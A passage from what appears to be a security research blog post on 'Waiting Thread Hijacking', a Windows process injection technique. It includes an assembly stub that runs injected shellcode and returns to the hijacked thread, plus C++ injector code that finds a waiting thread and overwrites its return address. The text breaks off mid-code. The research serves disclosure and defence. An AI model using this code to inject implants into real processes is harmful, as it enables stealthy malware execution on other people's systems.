<p class="wp-block-paragraph">In Waiting Thread Hijacking, we replace the original address with our own. So, once the wait finishes, the return address will be picked from the stack, and followed. Since now it is overwritten with the pointer to our shellcode, that will lead to the execution of the implant. However, we interrupted the normal execution flow of the function, so there is a risk to the stability of the target process. One way to prevent the crash at the end, is to make the shellcode never return – i.e.&nbsp;by making it stuck in the infinite&nbsp;<code>Sleep</code>&nbsp;loop. But it is not the best solution. For example, we will miss processing some events for which the thread was originally waiting. While this might not cause a critical issue, it’s still suboptimal.</p>



<p class="wp-block-paragraph">Fortunately, restoring the original execution flow is relatively straightforward with an appropriate stub.</p>



<p class="wp-block-paragraph">The template:</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-dracula enlighter-l-assembly enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">[SAVED_RET_PTR] </span><span class="enlighter-co0">; space where the original return pointer will be saved</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">pushf</span><span class="enlighter-text">           </span><span class="enlighter-co0">; store original flags, and values of registers:</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">push</span><span class="enlighter-text"> rax </span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">push</span><span class="enlighter-text"> rcx</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">push</span><span class="enlighter-text"> rdx</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">push</span><span class="enlighter-text"> rbx</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">push</span><span class="enlighter-text"> rbp</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">push</span><span class="enlighter-text"> rsi</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">push</span><span class="enlighter-text"> rdi</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">push</span><span class="enlighter-text"> r8</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">push</span><span class="enlighter-text"> r9</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">push</span><span class="enlighter-text"> r10</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">push</span><span class="enlighter-text"> r11</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">push</span><span class="enlighter-text"> r12</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">push</span><span class="enlighter-text"> r13</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">push</span><span class="enlighter-text"> r14</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">push</span><span class="enlighter-text"> r15</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">call</span><span class="enlighter-text"> shellcode_main </span><span class="enlighter-co0">; call our main shellcode function</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">pop</span><span class="enlighter-text"> r15             </span><span class="enlighter-co0">;restore original flags, and values of registers:</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">pop</span><span class="enlighter-text"> r14</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">pop</span><span class="enlighter-text"> r13</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">pop</span><span class="enlighter-text"> r12</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">pop</span><span class="enlighter-text"> r11</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">pop</span><span class="enlighter-text"> r10</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">pop</span><span class="enlighter-text"> r9</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">pop</span><span class="enlighter-text"> r8</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">pop</span><span class="enlighter-text"> rdi</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">pop</span><span class="enlighter-text"> rsi</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">pop</span><span class="enlighter-text"> rbp</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">pop</span><span class="enlighter-text"> rbx</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">pop</span><span class="enlighter-text"> rdx</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">pop</span><span class="enlighter-text"> rcx</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">pop</span><span class="enlighter-text"> rax</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">popf</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">jmp</span><span class="enlighter-text"> qword ptr ds:[SAVED_RET_PTR] </span><span class="enlighter-co0">;jump to the original return address</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">[shellcode_main] </span><span class="enlighter-co0">; the vital part of the shellcode</span></div></div></div><div class="enlighter-raw">[SAVED_RET_PTR] ; space where the original return pointer will be saved
pushf           ; store original flags, and values of registers:
push rax 
push rcx
push rdx
push rbx
push rbp
push rsi
push rdi
push r8
push r9
push r10
push r11
push r12
push r13
push r14
push r15
call shellcode_main ; call our main shellcode function
pop r15             ;restore original flags, and values of registers:
pop r14
pop r13
pop r12
pop r11
pop r10
pop r9
pop r8
pop rdi
pop rsi
pop rbp
pop rbx
pop rdx
pop rcx
pop rax
popf
jmp qword ptr ds:[SAVED_RET_PTR] ;jump to the original return address
[shellcode_main] ; the vital part of the shellcode</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="asm" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">[SAVED_RET_PTR] ; space where the original return pointer will be saved
pushf           ; store original flags, and values of registers:
push rax 
push rcx
push rdx
push rbx
push rbp
push rsi
push rdi
push r8
push r9
push r10
push r11
push r12
push r13
push r14
push r15
call shellcode_main ; call our main shellcode function
pop r15             ;restore original flags, and values of registers:
pop r14
pop r13
pop r12
pop r11
pop r10
pop r9
pop r8
pop rdi
pop rsi
pop rbp
pop rbx
pop rdx
pop rcx
pop rax
popf
jmp qword ptr ds:[SAVED_RET_PTR] ;jump to the original return address
[shellcode_main] ; the vital part of the shellcode</pre>



<p class="wp-block-paragraph">The stub starts from a free space of a pointer size. This is where the previous return address will be saved by the injector, before being replaced. The code starts after that. It saves the flags, and all the general purpose registers that may contain vital data needed to continue with normal execution later. With the context saved, we can now execute the shellcode responsible for any planned activity (in case of a PoC, that is, traditionally, popping up the calc.exe). After the main function returned, we restore the previously saved registers and flags, and then jump to the original return address.</p>



<p class="wp-block-paragraph">Let’s see it in action.</p>



<p class="wp-block-paragraph">Step 1 – As the wait finished, the execution is about to follow the return address. In our case, the address on the stack has been replaced.</p>


<div class="wp-block-image">
<figure class="aligncenter size-full"><img decoding="async" width="880" height="223" src="https://research.checkpoint.com/wp-content/uploads/2025/04/1BJM555JLK-rId73.png" alt="" class="wp-image-31355"><figcaption class="wp-element-caption">Figure 4 – Inside the syscall wrapper:&nbsp;<code>NtWaitForWorkViaWorkerFactory</code>. Upon the syscall completion, the function will pick the first entry from the stack, that was overwritten, and use it as a return address.</figcaption></figure>
</div>


<p class="wp-block-paragraph">Step 2 – The shellcode starts execution from saving all the flags, and registers. They will be restored at the end, to recover the original values.</p>


<div class="wp-block-image">
<figure class="aligncenter size-full"><img decoding="async" width="975" height="435" src="https://research.checkpoint.com/wp-content/uploads/2025/04/1BJM555JLK-rId76.png" alt="" class="wp-image-31356"><figcaption class="wp-element-caption">Figure 5 – View of the stub within the implanted shellcode. The right panel shows the values of the registers BEFORE the shellcode execution.</figcaption></figure>
</div>


<p class="wp-block-paragraph">Step 3 – The shellcode finished its execution. The registers are restored to the same state as they were in the beginning. The jump at the end of the shellcode will take us back to the original return address.</p>


<div class="wp-block-image">
<figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="981" height="461" src="https://research.checkpoint.com/wp-content/uploads/2025/04/1BJM555JLK-rId79.png" alt="" class="wp-image-31357"><figcaption class="wp-element-caption">Figure 6 – View of the stub within the implanted shellcode. The right panel shows the values of the registers AFTER the shellcode execution.</figcaption></figure>
</div>


<p class="wp-block-paragraph">Step 4 – The execution returns to the original function.</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2025/04/1BJM555JLK-rId82.png" alt="Figure 8 - After the implant finished, the execution flow returned to
the place where the syscall wrapper would normally return."><figcaption class="wp-element-caption">Figure 7 – After the implant finished, the execution flow returned to the place where the syscall wrapper would normally return.</figcaption></figure>
</div>


<h1 class="wp-block-heading" id="implementation">Implementation</h1>



<p class="wp-block-paragraph">Having all those building blocks, let’s have a look at the final implementation.</p>


<div class="wp-block-image">
<figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="621" height="321" src="https://research.checkpoint.com/wp-content/uploads/2025/04/rId87.gif" alt="" class="wp-image-31359"><figcaption class="wp-element-caption">Figure 8 – Animation showing all the main steps of Waiting Thread Hijacking.</figcaption></figure>
</div>


<p class="wp-block-paragraph">The writes (and possible allocation) are done in a standard way, using&nbsp;<code>VirtualAllocEx</code>&nbsp;+&nbsp;<code>WriteProcessMemory</code>. After the shellcode is planted in the target, we proceed to set up for its execution. Enumerating all the threads in the process, we scan for those that are currently in a waiting mode, select one of them, and overwrite its return address. Once the thread switches back to the active mode, it will resume its execution returning to the replaced address, which now leads to the implant. After executing the implant, the thread should return seamlessly to its casual duties.</p>



<p class="wp-block-paragraph">Code snippet:</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-dracula enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-k5">bool</span><span class="enlighter-text"> </span><span class="enlighter-m0">check_ret_target</span><span class="enlighter-g1">(</span><span class="enlighter-text">LPVOID ret</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    HMODULE mod = </span><span class="enlighter-m0">get_module_by_address</span><span class="enlighter-g1">((</span><span class="enlighter-text">LPVOID</span><span class="enlighter-g1">)</span><span class="enlighter-text">ret</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">mod == </span><span class="enlighter-e1">NULL</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        std::cout </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"Pointer not in any recognized module.\n"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k0">return</span><span class="enlighter-text"> </span><span class="enlighter-e0">false</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">mod == </span><span class="enlighter-m0">GetModuleHandleA</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"ntdll.dll"</span><span class="enlighter-g1">)</span><span class="enlighter-text"> || </span></div></div><div class=""><div><span class="enlighter-text">        mod == </span><span class="enlighter-m0">GetModuleHandleA</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"kernelbase.dll"</span><span class="enlighter-g1">)</span><span class="enlighter-text"> || </span></div></div><div class=""><div><span class="enlighter-text">        mod == </span><span class="enlighter-m0">GetModuleHandleA</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"kernel32.dll"</span><span class="enlighter-g1">))</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k0">return</span><span class="enlighter-text"> </span><span class="enlighter-e0">true</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    std::cout </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"Pointer not in ntdll/kernel32.\n"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k0">return</span><span class="enlighter-text"> </span><span class="enlighter-e0">false</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k5">bool</span><span class="enlighter-text"> </span><span class="enlighter-m0">run_injected</span><span class="enlighter-g1">(</span><span class="enlighter-text">DWORD pid, ULONGLONG shellcodePtr, KWAIT_REASON wait_reason</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    std::cout </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"Enumerating threads of PID: "</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> pid </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"\n"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    std::map</span><span class="enlighter-g1">&lt;</span><span class="enlighter-text">DWORD, thread_info</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> threads_info;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">!pesieve::util::</span><span class="enlighter-m0">fetch_threads_info</span><span class="enlighter-g1">(</span><span class="enlighter-text">pid, threads_info</span><span class="enlighter-g1">))</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k0">return</span><span class="enlighter-text"> </span><span class="enlighter-e0">false</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    HANDLE hProcess = </span><span class="enlighter-m0">OpenProcess</span><span class="enlighter-g1">(</span><span class="enlighter-text">PROCESS_VM_READ | PROCESS_VM_WRITE, </span><span class="enlighter-e0">FALSE</span><span class="enlighter-text">, pid</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">!hProcess</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-k0">return</span><span class="enlighter-text"> </span><span class="enlighter-e0">false</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    CONTEXT ctx = </span><span class="enlighter-g1">{</span><span class="enlighter-text"> 0 </span><span class="enlighter-g1">}</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    ULONGLONG suitable_ret_ptr = 0;</span></div></div><div class=""><div><span class="enlighter-text">    ULONGLONG suitable_ret = 0;</span></div></div><div class=""><div><span class="enlighter-text">    std::cout </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"Threads: "</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> threads_info.</span><span class="enlighter-m3">size</span><span class="enlighter-g1">()</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> std::endl;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">for</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-k0">auto</span><span class="enlighter-text"> itr = threads_info.</span><span class="enlighter-m3">begin</span><span class="enlighter-g1">()</span><span class="enlighter-text">; itr != threads_info.</span><span class="enlighter-m3">end</span><span class="enlighter-g1">()</span><span class="enlighter-text">; ++itr</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        thread_info&amp; info = itr-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">second;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">!info.</span><span class="enlighter-m3">is_extended</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-k0">return</span><span class="enlighter-text"> </span><span class="enlighter-e0">false</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">info.</span><span class="enlighter-m3">ext</span><span class="enlighter-text">.</span><span class="enlighter-m3">state</span><span class="enlighter-text"> == Waiting</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            std::cout </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"TID: "</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> info.</span><span class="enlighter-m3">tid</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> std::hex </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">" : wait reason: "</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> std::dec </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> info.</span><span class="enlighter-m3">ext</span><span class="enlighter-text">.</span><span class="enlighter-m3">wait_reason</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"\n"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">info.</span><span class="enlighter-m3">ext</span><span class="enlighter-text">.</span><span class="enlighter-m3">wait_reason</span><span class="enlighter-text"> != wait_reason || !</span><span class="enlighter-m0">read_context</span><span class="enlighter-g1">(</span><span class="enlighter-text">info.</span><span class="enlighter-m3">tid</span><span class="enlighter-text">, ctx</span><span class="enlighter-g1">))</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">                </span><span class="enlighter-k1">continue</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            ULONGLONG ret = read_return_ptr</span><span class="enlighter-g1">&lt;</span><span class="enlighter-text">ULONGLONG</span><span class="enlighter-g1">&gt;(</span><span class="enlighter-text">hProcess, ctx.</span><span class="enlighter-m3">Rsp</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            std::cout </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"RET: "</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> std::hex </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> ret </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"\n"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">!suitable_ret_ptr</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">                </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">!</span><span class="enlighter-m0">check_ret_target</span><span class="enlighter-g1">((</span><span class="enlighter-text">LPVOID</span><span class="enlighter-g1">)</span><span class="enlighter-text">ret</span><span class="enlighter-g1">))</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">                    std::cout </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"Not supported ret target. Skipping!\n"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">                    </span><span class="enlighter-k1">continue</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">                </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">                suitable_ret_ptr = ctx.</span><span class="enlighter-m3">Rsp</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">                suitable_ret = ret;</span></div></div><div class=""><div><span class="enlighter-text">                std::cout </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"\tUsing as a target!\n"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">                </span><span class="enlighter-k1">break</span><span class="enlighter-text">; </span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">else</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            std::cout </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"TID: "</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> itr-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">first </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"is NOT waiting, State: "</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> info.</span><span class="enlighter-m3">ext</span><span class="enlighter-text">.</span><span class="enlighter-m3">state</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"\n"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k5">bool</span><span class="enlighter-text"> is_injected = </span><span class="enlighter-e0">false</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">suitable_ret_ptr</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-c0">// overwrite the shellcode with the jump back</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        SIZE_T written = 0;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">ntapi::</span><span class="enlighter-m0">WriteProcessMemory</span><span class="enlighter-g1">(</span><span class="enlighter-text">hProcess, </span><span class="enlighter-g1">(</span><span class="enlighter-text">LPVOID</span><span class="enlighter-g1">)</span><span class="enlighter-text">shellcodePtr, &amp;suitable_ret, </span><span class="enlighter-k3">sizeof</span><span class="enlighter-g1">(</span><span class="enlighter-text">suitable_ret</span><span class="enlighter-g1">)</span><span class="enlighter-text">, &amp;written</span><span class="enlighter-g1">)</span><span class="enlighter-text"> &amp;&amp; written == </span><span class="enlighter-k3">sizeof</span><span class="enlighter-g1">(</span><span class="enlighter-text">suitable_ret</span><span class="enlighter-g1">))</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            std::cout </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"Shellcode ptr overwritten! Written: "</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> written </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">" \n"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">else</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            std::cout </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"Failed to overwrite shellcode jmp back: "</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> std::hex </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-m0">GetLastError</span><span class="enlighter-g1">()</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"\n"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-k0">return</span><span class="enlighter-text"> </span><span class="enlighter-e0">false</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">!</span><span class="enlighter-m0">protect_memory</span><span class="enlighter-g1">(</span><span class="enlighter-text">pid, </span><span class="enlighter-g1">(</span><span class="enlighter-text">LPVOID</span><span class="enlighter-g1">)</span><span class="enlighter-text">shellcodePtr, </span><span class="enlighter-k3">sizeof</span><span class="enlighter-g1">(</span><span class="enlighter-text">g_payload</span><span class="enlighter-g1">)</span><span class="enlighter-text">, PAGE_EXECUTE_READ</span><span class="enlighter-g1">))</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            std::cerr </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"Failed making memory executable!\n"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-k0">return</span><span class="enlighter-text"> </span><span class="enlighter-e0">false</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        shellcodePtr += </span><span class="enlighter-n2">0x8</span><span class="enlighter-text">; </span><span class="enlighter-c0">// after the saved return...</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        std::cout </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"Trying to overwrite: "</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> std::hex </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> suitable_ret_ptr </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">" -&gt; 